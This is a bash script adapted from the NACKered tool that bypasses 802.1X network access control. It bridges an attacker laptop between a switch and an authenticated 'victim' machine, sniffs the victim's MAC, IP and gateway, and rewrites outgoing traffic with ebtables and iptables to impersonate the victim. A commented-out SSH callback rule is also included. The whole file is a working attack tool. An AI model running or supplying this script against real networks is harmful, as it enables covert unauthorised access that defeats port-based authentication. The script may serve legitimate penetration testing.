#!/bin/bash
#
# Dennis L - 802-1x-bridge
# Servicecentrum Drechtsteden (Netherlands)
#
# Based on NACKered 2.92.2 by Matt E (KPMG UK Cyber Defense Services)
# update for kali rolling and use iproute2 tools (as bridge utils are deprecated)
#
# requirements:
# iproute2
# arptables
# ebtables
# iptables
# macchanger
# mii-tool

report () {
   echo 
   read -p "$1, Press any key..." -n1 -s
   echo
}

/bin/systemctl stop network-manager
/sbin/modprobe br_netfilter
/sbin/sysctl net.ipv6.conf.all.disable_ipv6=1 > /dev/null 
echo > /etc/resolv.conf

printf "System prepared.\n"

# Vars used for Bridge
BRINT=br0			# bridge interface
BRIP=172.29.12.12	# bridge IP address		
DPORT=2222			# SSH Call back port (ssh victimip:2222 to connect to attackerip:22)
RANGE=61000-62000	# ports for own trafic on NAT

# Vars used for Switch-Side interface
SWINT=eth0
SWMAC=`/sbin/ip link show $SWINT | grep -i "link/ether" | awk '{ print $2 }'`

# Vars used for Victim Side interface
COMPINT=eth1

# Vars used globally
TIMER=30

printf "Variabeles defined.\n"

# create the bridge
/sbin/ip link add dev $BRINT type bridge
/sbin/ip link set $BRINT address 00:12:34:56:78:90	# change MAC of bridge to an initialization value

printf "Bridge interface added to system.\n"

# add bridge members
/sbin/ip link set $SWINT master $BRINT
/sbin/ip link set $COMPINT master $BRINT

printf "Bridge members added.\n"

# Make the bridge work
echo 8 > /sys/class/net/$BRINT/bridge/group_fwd_mask	# forward EAP packets
echo 1 > /proc/sys/net/bridge/bridge-nf-call-iptables

printf "Bridge configured.\n"

# bring up bridge members in promiscious mode
/sbin/ip link set $SWINT promisc on
/sbin/ip link set $SWINT up
/sbin/ip link set $COMPINT promisc on
/sbin/ip link set $COMPINT up

printf "Bridge members configured and activated.\n"

# swap MAC of bridge to the switch-side MAC
/usr/bin/macchanger -m $SWMAC $BRINT > /dev/null		

#bring up the bridge with a non-routable IP
/sbin/ip addr add 0.0.0.0 dev $BRINT
/sbin/ip link set $BRINT promisc on
/sbin/ip link set $BRINT up

printf "Bridge activated.\n"

# victim machine should work now

printf "Bridge is up, should be dark.\nConnect Ethernet cables to adapters and leave to steady.\n(Watch the lights, make sure they don't go out!)\n"
read -p "Press any key..." -n1 -s
printf "\n"
while [ $TIMER -gt 0 ]; do
   echo -ne "$TIMER\033[0K\r"
   sleep 1
   : $((TIMER--))
done

# Reset Eth connections
/sbin/mii-tool -r $COMPINT
/sbin/mii-tool -r $SWINT

# Listen for TCP traffic
printf "Listening for traffic...\n"
printf "Turn to Zero Client, and click connect once 802.1x authentication is succesful.\n"
# -i == used interface
# -s0 == snapshot length
# -w == write to file
# -c1 == count packets and exit after receiving this ammount
# tcp dst port 443 == packet to capture.
/usr/sbin/tcpdump -i $COMPINT -s0 -w /tmp/bridge.pcap -c1 tcp dst port 443

# Listen for COMPMAC, COMPIP, and GWMAC
COMPMAC=`/usr/sbin/tcpdump -r /tmp/bridge.pcap -nne -c 1 tcp dst port 443 | awk '{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $1}'`
COMPIP=`/usr/sbin/tcpdump -r /tmp/bridge.pcap -nne -c 1 tcp dst port 443 | awk '{print $3","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $3}'`
GWMAC=`/usr/sbin/tcpdump -r /tmp/bridge.pcap -nne -c 1 tcp dst port 443 | awk '{print $2","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $2}'`

printf "Victim details:\n"
printf "\tMAC:\t$COMPMAC\n"
printf "\tIP:\t$COMPIP\n"
printf "\tGW:\t$GWMAC\n"

# Remove capture file as it is no longer needed
rm /tmp/bridge.pcap

# Go silent, start dark
/sbin/arptables -A OUTPUT -j DROP
/sbin/iptables -A OUTPUT -j DROP
printf "All traffic, originating this laptop, is now dropped.\n"

# Set non-routable IP on bridge
/sbin/ip addr add $BRIP dev $BRINT

# Anything leaving this box with the switch side MAC on the switch interface or bridge interface rewrite and give it the victims MAC
/sbin/ebtables -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC
/sbin/ebtables -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat --to-src $COMPMAC
printf "Spoof Victims MAC.\n"

#Create default routes so we can route traffic - all traffic goes to 169.254.66.1 and this traffic gets Layer 2 sent to GWMAC
/usr/sbin/arp -i $BRINT -s 169.254.66.1 $GWMAC
#/sbin/route add default gw 172.29.12.1
/sbin/ip route add default dev $BRINT
/sbin/ip route change default via 169.254.66.1 dev $BRINT

#SSH CALLBACK if we receieve inbound on br0 for VICTIMIP:DPORT forward to BRIP on 22 (SSH)
#/sbin/iptables -t nat -A PREROUTING -i $BRINT -d $COMPIP -p tcp --dport $DPORT -j DNAT --to $BRIP:22

# Setting up Layer 3 rewrite rules
#Anything on any protocol leaving OS on BRINT with BRIP rewrite it to COMPIP and give it a port in the range for NAT
/sbin/iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to $COMPIP:$RANGE
/sbin/iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp -j SNAT --to $COMPIP:$RANGE
/sbin/iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMPIP
printf "Spoof Victims IP.\n"

#/bin/systemctl start ssh

printf "All setup steps complete; check ports are still lit and operational.\n"

#Re-enable L2 and L3
/sbin/arptables -D OUTPUT -j DROP
/sbin/iptables -D OUTPUT -j DROP

printf "Time for fun & profit.\n"
